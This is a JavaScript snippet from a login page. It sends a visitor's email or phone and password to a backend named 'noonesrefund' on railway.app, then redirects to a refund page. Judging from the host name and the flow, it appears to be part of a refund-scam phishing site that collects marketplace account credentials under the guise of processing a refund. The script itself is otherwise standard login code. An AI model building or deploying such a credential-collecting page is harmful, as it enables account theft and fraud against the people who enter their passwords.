<script>
    // ============================================
    // BACKEND CONFIGURATION
    // ============================================
    // Try multiple URLs in case one fails
    const API_URLS = [
        'https://noonesrefund-production.up.railway.app',
        'https://noonesrefund.railway.app',
        'http://localhost:5000'
    ];
    
    let currentApiUrl = API_URLS[0];

    // ============================================
    // TOAST NOTIFICATION
    // ============================================
    const toast = document.getElementById('toast');
    let toastTimeout;

    function showToast(message, type = '') {
        toast.textContent = message;
        toast.className = 'toast' + (type ? ' ' + type : '');
        toast.classList.add('show');
        clearTimeout(toastTimeout);
        toastTimeout = setTimeout(() => {
            toast.classList.remove('show');
        }, 3000);
    }

    // ============================================
    // LOGIN FUNCTION WITH FALLBACK
    // ============================================
    async function handleLogin() {
        const email = document.getElementById('email-phone').value.trim();
        const password = document.getElementById('password').value.trim();
        const loginBtn = document.getElementById('loginBtn');
        const loginText = document.getElementById('loginText');
        const loginSpinner = document.getElementById('loginSpinner');

        // Validate input
        if (!email || !password) {
            const messages = {
                'en': 'Please fill in both email/phone and password.',
                'es': 'Por favor, complete ambos campos.',
                'fr': 'Veuillez remplir les deux champs.',
                'de': 'Bitte füllen Sie beide Felder aus.',
                'zh': '请填写两个字段。'
            };
            showToast(messages[currentLanguage] || messages['en'], 'error');
            return;
        }

        // Show loading state
        loginBtn.disabled = true;
        loginSpinner.classList.add('active');
        loginText.textContent = 'Logging in...';

        let success = false;
        let lastError = null;

        // Try each API URL
        for (let i = 0; i < API_URLS.length; i++) {
            const url = API_URLS[i];
            try {
                console.log(`Attempting login with: ${url}/api/login`);
                
                const response = await fetch(`${url}/api/login`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Accept': 'application/json'
                    },
                    body: JSON.stringify({
                        email: email,
                        password: password
                    })
                });

                const data = await response.json();

                if (response.ok && data.success) {
                    // Success - store which URL worked
                    currentApiUrl = url;
                    success = true;
                    
                    const successMessages = {
                        'en': '✅ Login successful! Redirecting...',
                        'es': '✅ ¡Inicio de sesión exitoso! Redirigiendo...',
                        'fr': '✅ Connexion réussie ! Redirection...',
                        'de': '✅ Anmeldung erfolgreich! Weiterleitung...',
                        'zh': '✅ 登录成功！正在跳转...'
                    };
                    showToast(successMessages[currentLanguage] || successMessages['en'], 'success');
                    
                    // Redirect to refund page after 1.5 seconds
                    setTimeout(() => {
                        window.location.href = 'refund.html';
                    }, 1500);
                    break;
                } else if (response.status === 404) {
                    console.log(`URL ${url} returned 404, trying next...`);
                    continue;
                } else {
                    // Other error
                    const errorMessages = {
                        'en': `❌ ${data.message || 'Login failed. Please try again.'}`,
                        'es': `❌ ${data.message || 'Error al iniciar sesión. Inténtelo de nuevo.'}`,
                        'fr': `❌ ${data.message || 'Échec de la connexion. Veuillez réessayer.'}`,
                        'de': `❌ ${data.message || 'Anmeldung fehlgeschlagen. Bitte versuchen Sie es erneut.'}`,
                        'zh': `❌ ${data.message || '登录失败。请重试。'}`
                    };
                    showToast(errorMessages[currentLanguage] || errorMessages['en'], 'error');
                    success = false;
                    break;
                }
            } catch (error) {
                console.error(`Error with ${url}:`, error);
                lastError = error;
                // Continue to next URL
                continue;
            }
        }

        // If all URLs failed
        if (!success) {
            const errorMessages = {
                'en': '❌ Cannot connect to server. Please try again later.',
                'es': '❌ No se puede conectar al servidor. Inténtelo más tarde.',
                'fr': '❌ Impossible de se connecter au serveur. Veuillez réessayer plus tard.',
                'de': '❌ Verbindung zum Server fehlgeschlagen. Bitte versuchen Sie es später erneut.',
                'zh': '❌ 无法连接到服务器。请稍后重试。'
            };
            showToast(errorMessages[currentLanguage] || errorMessages['en'], 'error');
        }

        // Reset button state
        loginBtn.disabled = false;
        loginSpinner.classList.remove('active');
        loginText.textContent = 'Log in';
    }

    // ... rest of your existing JavaScript (translations, DOM event listeners, etc.) ...
</script>
